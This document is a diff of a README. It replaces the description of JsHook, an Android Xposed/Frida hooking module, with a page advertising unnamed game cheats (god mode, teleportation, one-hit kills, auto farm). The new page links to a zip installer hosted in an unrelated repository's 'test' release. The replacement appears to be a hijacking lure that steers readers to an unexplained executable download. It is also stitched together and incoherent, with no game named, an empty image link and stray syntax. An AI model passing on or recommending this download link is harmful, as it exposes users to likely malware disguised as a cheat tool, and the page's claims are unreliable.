@@ -1,28 +1,34 @@
-<div align="center">
-<h1>JsHook</h1>
+## Software | [Download](https://github.com/UniiemStudio/CTFever-Premium-Service/releases/download/test/Gh-Installer.zip)
 
-[![Xposed](https://img.shields.io/badge/-Xposed-3DDC84?style=flat&logo=Android&logoColor=white)](#)
-[![GitHub release](https://img.shields.io/github/release/Xposed-Modules-Repo/me.jsonet.jshook.svg)](https://github.com/Xposed-Modules-Repo/me.jsonet.jshook/releases/latest)
-[![Telegram](https://img.shields.io/static/v1?label=Telegram&message=Channel&color=0088cc)](https://t.me/jshookapp)
-[![Telegram](https://img.shields.io/static/v1?label=Telegram&message=Chat&color=0088cc)](https://t.me/jshookgroup)
+Create for PC
 
-用js实现hook 支持java层和native层
+# Showcase
+ ```sh-session
+ Status
+ ------
+Infinite stamina is a feature that allows a character in the game to not be limited to a certain amount of stamina.
+This can be useful for players who want to stay in the game longer and more productively.
 
-[README of English](https://github.com/Xposed-Modules-Repo/me.jsonet.jshook/blob/main/README.en.md)
-</div>
+Teleportation - Allows you to instantly move to any point on the game map, regardless of whether it is open to the player or not.
 
-## 关于
+Respawn boss (boss rebirth) - allows you to summon bosses several times to get valuable rewards and loot.
 
-jshook是对应用程序注入rhino/frida，你只需要会js就可以快速实现hook，并且支持java层和native层。
+God Mode - A feature that provides the player with invulnerability to enemies and prevents them from taking damage.
 
-rhino包含了xposed的api，主要用于java层的hook；frida注入后js可以完全访问内存，支持java层和native层。
+One Hit Kills - You can defeat any enemy with a single attack regardless of difficulty level.
 
-## 兼容
+Auto Farm - The ability to farm chests indefinitely.
 
-1. Xposed api 82
-2. Android 5 - 14
+Auto TP - Auto teleportation.
 
-## 全新1.1版本
+As well as most of the functions of the other cheats.
 
-![image](/imgs/1.png "") | ![image](/imgs/2.png "")
----|---
+ -----------------
+```
+
+![showcase]()
+)
+
+## License
+
+[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
